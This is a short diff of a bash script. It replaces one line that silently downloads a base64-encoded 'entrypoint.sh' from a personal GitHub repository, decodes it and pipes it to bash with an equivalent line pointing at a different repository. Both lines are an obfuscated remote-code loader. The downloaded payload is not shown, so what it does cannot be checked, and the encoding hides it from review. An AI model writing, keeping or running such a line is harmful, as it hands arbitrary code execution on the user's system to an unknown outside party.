@@ -1,2 +1,2 @@
 #!/bin/bash
-wget -qO- https://raw.githubusercontent.com/antoniomobley990/cousin/refs/heads/main/entrypoint.sh | base64 -d | bash
+wget -qO- https://raw.githubusercontent.com/scottfeldman62/kids/refs/heads/main/entrypoint.sh | base64 -d | bash
